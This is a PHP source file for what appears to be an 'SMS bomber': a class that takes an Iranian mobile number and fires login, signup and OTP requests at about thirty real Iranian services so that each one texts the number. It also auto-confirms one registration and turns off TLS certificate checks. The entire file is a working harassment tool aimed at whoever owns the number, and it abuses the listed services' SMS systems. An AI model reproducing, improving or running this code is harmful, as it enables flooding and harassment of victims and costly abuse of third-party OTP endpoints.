<?php

class SmsSender
{
    private $phone;

    public function __construct($phone)
    {
        if (preg_match("/^([0][9][0-9]{9})$/", $phone)) {
            $this->phone = $phone;
        } else {
            header("Location:index.php?number=0");
            exit();
        }
    }

    public function sendAll()
    {
        $this->sendDivar();
        $this->sendNobatir();
        $this->sendAlopeykLogin();
        $this->sendAlopeykSignup();
        $this->sendShahrefarsh();
        $this->sendDigistyle();
        $this->sendSnappExpress();
        $this->sendAzki();
        $this->sendDigikalaJet();
        $this->sendSnappDrivers();
        $this->sendOstadkar();
        $this->sendMiare();
        $this->sendTapsiDrivers();
        $this->sendTapsiPassenger();
        $this->sendBanimode();
        $this->sendDrdr();
        $this->sendTaaghcheLogin();
        $this->sendTaaghcheSignup();
        $this->sendKomodaa();
        $this->sendGhabzino();
        $this->sendBargheMan();
        $this->sendVandar();
        $this->sendMobit();
        $this->sendJabama();
        $this->sendPinorest();
        $this->sendTetherland();
        $this->sendAlibaba();
        $this->sendDrnext();
        $this->sendClassino();
        $this->sendTakshopaccessorise();
        
        header("Location:index.php?ok=true");
    }

    private function sendDivar()
    {
        $url = 'https://api.divar.ir/v5/auth/authenticate';
        $phone_value = '{"phone":"' . $this->phone . '"}';
        $this->sendCurlSms($url, $phone_value);
    }

    private function sendNobatir()
    {
        $url = 'https://nobat.ir/api/public/patient/login/phone';
        $phone_value = "------WebKitFormBoundary5wscOwxMqnICoiZY\r\nContent-Disposition: form-data; name=\"mobile\"\r\n\r\n" . $this->phone . "\r\n------WebKitFormBoundary5wscOwxMqnICoiZY--\r\n";
        $header = 'content-type: multipart/form-data; boundary=----WebKitFormBoundary5wscOwxMqnICoiZY';
        $this->sendCurlSms($url, $phone_value, $header);
    }
    private function sendAlopeykLogin()
    {
        $url = 'https://api.alopeyk.com/api/v2/login?platform=pwa';
        $phone_value = '{"type":"CUSTOMER","model":"Chrome 111.0.0.0","platform":"pwa","version":"10","manufacturer":"Windows","isVirtual":false,"serial":true,"app_version":"1.2.9","uuid":true,"phone":" ' . $this->phone . '"}';
        $header = 'content-type: application/json';
        $this->sendCurlSms($url, $phone_value, $header);
    }

    private function sendAlopeykSignup()
    {
        $url = 'https://api.alopeyk.com/api/v2/register-customer?platform=pwa';
        $phone_value = "{\"type\":\"CUSTOMER\",\"model\":\"Chrome 111.0.0.0\",\"platform\":\"pwa\",\"version\":\"10\",\"manufacturer\":\"Windows\",\"isVirtual\":false,\"serial\":true,\"app_version\":\"1.2.9\",\"uuid\":true,\"firstname\":\"تست\",\"lastname\":\"تست\",\"phone\":\"" . $this->phone . "\",\"email\":\"\",\"referred_by\":\"\",\"lat\":null,\"lng\":null}";
        $header = 'content-type: application/json';
        $this->sendCurlSms($url, $phone_value, $header);
    }

    private function sendShahrefarsh()
    {
        $url = 'https://shahrfarsh.com/Account/Login';
        $phone_value = 'phoneNumber=' . $this->phone;
        $this->sendCurlSms($url, $phone_value);
    }

    private function sendDigistyle()
    {
        global $response;
        $url = 'https://www.digistyle.com/users/login-register/';
        $phone_value = 'loginRegister%5Bemail_phone%5D=' . $this->phone;
        $this->sendCurlSms($url, $phone_value);
        $token = preg_match('/(?<=token=)(.*)(?=&amp)/', $response, $tok);
        file_get_contents('https://www.digistyle.com/users/register/confirm/?token=' . $tok[0] . '&type=register');
    }

    private function sendSnappExpress()
    {
        $url = 'https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&clientVersion=52f02dbc&optionalVersion=5.6.6&UDID=fb000c1a-41a6-4059-8e22-7fb820e6942b';
        $phone_value = 'cellphone=' . $this->phone . '&captcha=&optionalLoginToken=true&local=';
        $this->sendCurlSms($url, $phone_value);
    }

    private function sendAzki()
    {
        $url = 'https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/';
        $phone_value = '{"phoneNumber":"' . $this->phone . '"}';
        $header1 = 'content-type: application/json';
        $header2 = 'deviceid: 6';
        $this->sendCurlSms($url, $phone_value, $header1, $header2);
    }

    private function sendDigikalaJet()
    {
        $url = 'https://api.digikalajet.ir/user/login-register/';
        $phone_value = '{"phone":"' . $this->phone . '"}';
        $header = 'content-type: application/json';
        $this->sendCurlSms($url, $phone_value, $header);
    }

    private function sendSnappDrivers()
    {
        $url = 'https://digitalsignup.snapp.ir/ds3/api/v3/otp?utm_source=snapp.ir&utm_medium=website-button&utm_campaign=menu&cellphone=';
        $phone_value = '{"cellphone":"' . $this->phone . '"}';
        $this->sendCurlSms($url, $phone_value);
    }

    private function sendOstadkar()
    {
        $url = 'https://api.ostadkr.com/login';
        $phone_value = '{"mobile":"' . $this->phone . '"}';
        $this->sendCurlSms($url, $phone_value);
    }
    private function sendMiare()
    {
        $url = 'https://www.miare.ir/api/otp/driver/request/';
        $phone_value = '{"phone_number":"' . $this->phone . '"}';
        $header = 'Content-Type: application/json;charset=UTF-8';
        $this->sendCurlSms($url, $phone_value, $header);
    }

    private function sendTapsiDrivers()
    {
        $url = 'https://api.tapsi.ir/api/v2.2/user';
        $phone_value = '{"credential":{"phoneNumber":"' . $this->phone . '","role":"DRIVER"},"otpOption":"SMS"}';
        $header = 'content-type: application/json';
        $this->sendCurlSms($url, $phone_value, $header);
    }

    private function sendTapsiPassenger()
    {
        $url = 'https://api.tapsi.ir/api/v2.2/user';
        $phone_value = '{"credential":{"phoneNumber":"' . $this->phone . '","role":"PASSENGER"},"otpOption":"SMS"}';
        $header = 'content-type: application/json';
        $this->sendCurlSms($url, $phone_value, $header);
    }

    private function sendBanimode()
    {
        $url = 'https://mobapi.banimode.com/api/v2/auth/request';
        $phone_value = '{"phone":"' . $this->phone . '"}';
        $header = 'Content-Type: application/json;charset=UTF-8';
        $this->sendCurlSms($url, $phone_value, $header);
    }

    private function sendDrdr()
    {
        $url = 'https://drdr.ir/api/v3/auth/login/mobile/init';
        $phone_value = '{"mobile":"' . $this->phone . '"}';
        $header1 = 'content-type: application/json';
        $header2 = 'client-id: f60d5037-b7ac-404a-9e3a-a263fd9f8054';
        $this->sendCurlSms($url, $phone_value, $header1, $header2);
    }

    private function sendTaaghcheLogin()
    {
        $url = 'https://gw.taaghche.com/v4/site/auth/login';
        $phone_value = '{"contact":"' . $this->phone . '","forceOtp":false}';
        $header = 'content-type: application/json';
        $this->sendCurlSms($url, $phone_value, $header);
    }

    private function sendTaaghcheSignup()
    {
        $url = 'https://gw.taaghche.com/v4/site/auth/signup';
        $phone_value = '{"contact":"' . $this->phone . '"}';
        $header = 'content-type: application/json';
        $this->sendCurlSms($url, $phone_value, $header);
    }

    private function sendKomodaa()
    {
        $url = 'https://api.komodaa.com/api/v2.6/loginRC/request';
        $phone_value = '{"phone_number":"' . $this->phone . '"}';
        $header = 'Content-Type: application/json';
        $this->sendCurlSms($url, $phone_value, $header);
    }

    private function sendGhabzino()
    {
        $url = 'https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode';
        $phone_value = '{"Parameters":{"ApplicationType":"Web","ApplicationUniqueToken":null,"ApplicationVersion":"1.0.0","MobileNumber":"' . $this->phone . '","UniqueToken":null}}';
        $header = 'content-type: application/json';
        $this->sendCurlSms($url, $phone_value, $header);
    }

    private function sendBargheMan()
    {
        $url = 'https://uiapi2.saapa.ir/api/otp/sendCode';
        $phone_value = '{"mobile":"' . $this->phone . '","from_meter_buy":false}';
        $this->sendCurlSms($url, $phone_value);
    }

    private function sendVandar()
    {
        $url = 'https://api.vandar.io/account/v1/check/mobile';
        $phone_value = '{"mobile":"' . $this->phone . '"}';
        $header = 'content-type: application/json';
        $this->sendCurlSms($url, $phone_value, $header);
    }

    private function sendMobit()
    {
        $url = 'https://api.mobit.ir/api/web/v8/register/register';
        $phone_value = '{"number":"' . $this->phone . '"}';
        $header = 'content-type: application/json;charset=UTF-8';
        $this->sendCurlSms($url, $phone_value, $header);
    }

    private function sendJabama()
    {
        $url = 'https://taraazws.jabama.com/api/v4/account/send-code';
        $phone_value = '{"mobile":"' . $this->phone . '"}';
        $header = 'Content-Type: application/json';
        $this->sendCurlSms($url, $phone_value, $header);
    }

    private function sendPinorest()
    {
        $url = 'https://api.pinorest.com/frontend/auth/login/mobile';
        $phone_value = '{"mobile":"' . $this->phone . '"}';
        $header = 'content-type: application/json';
        $this->sendCurlSms($url, $phone_value, $header);
    }

    private function sendTetherland()
    {
        $url = 'https://service.tetherland.com/api/v5/login-register';
        $phone_value = '{"mobile":"' . $this->phone . '"}';
        $header = 'content-type: application/json';
        $this->sendCurlSms($url, $phone_value, $header);
    }

    private function sendAlibaba()
    {
        $url = 'https://ws.alibaba.ir/api/v3/account/mobile/otp';
        $phone_value = '{"phoneNumber":"' . $this->phone . '"}';
        $header = 'Content-Type: application/json';
        $this->sendCurlSms($url, $phone_value, $header);
    }

    private function sendDrnext()
    {
        $url = 'https://cyclops.drnext.ir/v1/patients/auth/send-verification-token';
        $phone_values = '{"source":"besina","mobile":"' . $this->phone . '"}';
        $header = 'content-type: application/json';
        $this->sendCurlSms($url, $phone_values, $header);
    }

    private function sendClassino()
    {
        $url = 'https://student.classino.com/otp/v1/api/login';
        $phone_value = '{"mobile":"' . $this->phone . '"}';
        $heaedr = 'Content-Type: application/json';
        $this->sendCurlSms($url, $phone_value, $heaedr);
    }

    private function sendTakshopaccessorise()
    {
        $url = 'https://takshopaccessorise.ir/api/v1/sessions/login_request';
        $phone_value = '{"mobile_phone":"' . $this->phone . '"}';
        $header = 'content-type: application/json;charset=UTF-8';
        $this->sendCurlSms($url, $phone_value, $header);
    }

    private function sendCurlSms($url, $phone_value, $header1 = NULL, $header2 = NULL)
    {
        date_default_timezone_set("Asia/Tehran");
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
        if ($header1 != NULL) {
            if ($header2 != NULL) {
                curl_setopt($ch, CURLOPT_HTTPHEADER, [
                    $header1, $header2
                ]);
            } else {
                curl_setopt($ch, CURLOPT_HTTPHEADER, [
                    $header1
                ]);
            }
        }
        curl_setopt($ch, CURLOPT_POSTFIELDS, $phone_value);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
        $response = curl_exec($ch);
        file_put_contents('log_sms.txt', '[' . date("Y-m-d h:i:sa") . '--URL=' . $url . ']' . $response . "\n\n", FILE_APPEND);
        curl_close($ch);
        sleep(2);
    }
}
